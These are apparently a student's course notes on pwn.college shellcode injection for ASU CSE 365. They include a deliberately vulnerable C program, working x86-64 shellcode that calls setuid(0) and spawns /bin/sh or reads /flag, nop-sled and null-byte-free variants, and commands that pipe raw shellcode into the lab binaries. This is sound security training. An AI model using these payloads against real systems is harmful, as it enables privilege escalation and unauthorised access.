---
title: "PwnCollege_Note6"
description: ASU CSE 365, shellcode injection
date: 2023-03-03
image: pwncollege.png
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - Pwn.college
    - ForeignCourse






---

# Shellcode Injection

-----------**ASU CSE 365**: System Security

## Shellcode Injection: Introduction

①an example of vulnerability:

```c
//a.c
void bye1() {puts("Goodbye!");}
void bye2() {puts("Farewell!");}
void hello(char *name,void (*bye_func)()){
    //A pointer to a character array name;
    //A function pointer points to a function
	printf("Hello %s!\n",name);
	bye_func();
}

int main(int argc, char **argv){
	char name[1024];
	gets(name);
	srand(time(0));
	if(rand()%2) hello(bye1,name); //a mix-up of argument order
	else hello(name,bye2);
}
```

> use **gcc -w -z execstack -o a a.c** to compile
>
> -w: Does not generate any warning information
>
> -z: pass the keyword ----> linker

![](index.assets/image-20230307183451013.png)

- So now the address of `bye1` is passed to `name` so `name` indicates the memory address of `bye1`. Now `name` is a binary code(the data is treated as code) . 
- if we pass the character array `name` to `bye_func` , the character array will be cast to a function pointer type. Because of the Incompatibility the program may be crash.

<img src="index.assets/image-20230307182642006.png" alt="image-20230307182642006" style="zoom:50%;" />

results: 

<img src="index.assets/image-20230307184408869.png" alt="image-20230307184408869" style="zoom: 80%;" />

use gdb to debugging:

![image-20230307190620265](index.assets/image-20230307190620265.png)

![image-20230307190643496](index.assets/image-20230307190643496.png)

**x/s**: viewing the string at an address

**x/i**: view the instructions at an address

![image-20230307190745633](index.assets/image-20230307190745633.png)

②shellcode--->achieve arbitrary command execution like launch a shell `execve("/bin/sh",NULL,NULL)`

```assembly
mov rax, 59				#execve
lea rdi, [rip+binsh]	#first argument
mov rsi, 0				#second
mov rdx, 0				#third
syscall
binsh:
.string "/bin/sh"
```

we can intersperse arbitrary data in shellcode

- **.byte 0x48, 0x45, 0x4C, 0x4C, 0x4F**   "HELLO"
- **.string "HELLO"**                          "HELLO\0"

other ways to embed data

```assembly
mov rbx, 0x0068732f6e69622f #move "/bin/sh\0" into rbx
push rbx					#push "/bin/sh\0" onto the stack
mov rdi, rsp				#point rdi at the stack
```

③Non-shell shellcode

another goal:

```assembly
mov rbx, 0x00000067616c662f		#push "/flag" filename
push rbx						
mov rax, 2						#syscall number of open
mov rdi, rsp					#point the first argument at stack (where we have "./flag")
mov rsi, 0						#NULL out the second argument (meaning, O_RDONLY)
syscall							#trigger open("/flag",NULL)

mov rdi, 1						#first argument to sendfile is the file descriptor to output to (stdout)
mov rsi, rax					#second argument is the file descriptor returned by open
mov rdx, 0						#third argument is the number of bytes to skip from the input file
mov r10, 1000					#fourth argument is the number of bytes to transfer to the output file
mov rax, 40						#syscall number of sendfile
syscall							#trigger sendfile(1,fd,0,1000) [out_fd,in_fd,offset,count]

mov rax, 60						#syscall number of exit
syscall							#trigger exit()
```

④building shellcode

```shell
gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf
#extract the .text (raw bytes of the shellcode)
```

![](index.assets/image-20230308145843974.png)

![](index.assets/image-20230308150055638.png)

**shellcoding**

> `echo "" >> shellcode-raw` to make a newline

![](index.assets/image-20230308150737870.png)

this command pushes the binary code in the `shellcode-raw` file to an executable file `./a` and the second `cat` outputs the result of `./a`

⑤debugging shellcode ---> **strace** & **gdb**

"ctrl + r" can search for the matched last used command in the history in linux shell

```
x/5i $rip : print the next 5 instructions
examine qwords(x/gx $rsp), dwords(x/2dx $rsp), halfwords(x/4hx $rsp), and bytes(x/8b $rsp)
step one instruction(follow call):si, NOT s
step one instruction(step over call):ni, NOT n
```

![](index.assets/image-20230308161613858.png)

## babyshell

**code injection**	=> This challenge reads in some bytes, modifies them , and executes them as code! Shellcode will be copied onto the stack and executed. Since the stack location is randomized on every execution, your shellcode will need to be *position-independent*.

level1: **Placing shellcode on the stack at 0x123456789abc; Write and execute shellcode to read the flag**

```c
//babyshell.c
shellcode_size = read(0, shellcode_mem, 0x1000); //Reading 0x1000 bytes from stdin.
```

| NR   | SYSCALL NAME | references | RAX  | RDI       | RSI  | RDX  | r10  | r8   | r9   |
| ---- | ------------ | ---------- | ---- | --------- | ---- | ---- | ---- | ---- | ---- |
| 105  | setuid       | man/ cs/   | 0x69 | uid_t uid | -    | -    | -    | -    | -    |

```assembly
# 1.s
.global _start
_start:
.intel_syntax noprefix
        mov rax, 0x69           #setuid
        mov rdi, 0
        syscall

        mov rax, 59             #execve
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"
```

in shell:

```shell
gcc -static -nostdlib 1.s -o 1
objcopy --dump-section .text=out 1
(cat out; cat) | /challenge/babyshell_level1
cat /flag #get flag
```

**another way to directly read the flag**

```assembly
.global _start
_start:
.intel_syntax noprefix

        #open
        mov rsi, 0
        lea rdi, [rip+flag]
        mov rax, 2
        syscall

        #read
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 100
        mov rax, 0
        syscall

        #write
        mov rdi, 1
        mov rsi, rsp
        mov rdx, rax
        mov rax, 1
        syscall

        #exit
        mov rax, 60
        mov rdi, 42
        syscall

flag:
        .ascii "/flag\0"
```

level2: **a portion of your input is randomly skipped. nop sled**

**Repeat macro assemblers**: This challenge will randomly skip up to 0x800 bytes in your shellcode. One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the
actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. 

```assembly
#add the code below to the front of the level1_code
.rept 0x800
	nop
.endr
```

level3: **inputted data is filtered before execution. Mapping shellcode memory at 0x12345678**

- This challenge requires that your shellcode have no **NULL** bytes

```assembly
.global _start
_start:
.intel_syntax noprefix

        #open
        xor rsi, rsi            #change
        #lea rdi, [rip+flag]
        mov byte ptr [rsp], '/'
        mov byte ptr [rsp+1], 'f'
        mov byte ptr [rsp+2], 'l'
        mov byte ptr [rsp+3], 'a'
        mov byte ptr [rsp+4], 'g'
        xor cl, cl
        mov byte ptr [rsp+5], cl
        mov rdi, rsp
        #mov byte ptr [rsp+5], '\0'
        xor rax, rax            #must xor!
        mov al, 2               #change
        syscall

        #read
        mov rdi, rax
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 100             #change
        xor rax, rax            #change
        syscall

        #write
        xor rdi, rdi
        mov dil, 1              #change
        mov rsi, rsp
        mov rdx, rax
        xor rax, rax
        mov al, 1               #change ;inc rax can also be good
        syscall

        #exit
        xor rax, rax
        mov al, 60              #change
        xor rdi, rdi
        mov dil, 42             #change
        syscall

flag:
        .ascii "/flag"
```
